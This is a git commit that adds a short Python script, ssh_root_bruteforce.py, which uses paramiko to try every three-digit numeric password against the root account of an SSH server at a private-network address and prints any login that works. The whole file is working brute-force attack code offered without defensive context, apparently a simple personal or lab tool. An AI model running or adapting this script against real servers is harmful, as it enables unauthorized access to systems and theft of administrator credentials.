b99a0812fa1864b2a9e00a4f42b6e579507062d8
tomek <luci6969@protonmail.ch>
2022-05-14 15:22:02 +0200

    Add ssh_root_bruteforce.py

---
+++ ssh_root_bruteforce.py
@@ -0,0 +1,21 @@
+import itertools
+import string
+import paramiko
+def logging_ssh(hostname, username, password):
+    ssh_session = paramiko.SSHClient()
+    ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh_session.connect(hostname=hostname, username=username, password=password, timeout=3)
+        print(username, password)
+        return True
+    except paramiko.ssh_exception.AuthenticationException as error:
+        print("Nie poprawne haslo lub login")
+        ssh_session.close()
+        return False
+hostname = "192.168.55.8"
+username = "root"
+passwords = []
+
+for guess_password in itertools.product(string.digits, repeat=3):
+        password = "".join(guess_password)
+        logging_ssh(hostname=hostname, username=username, password=str(password))
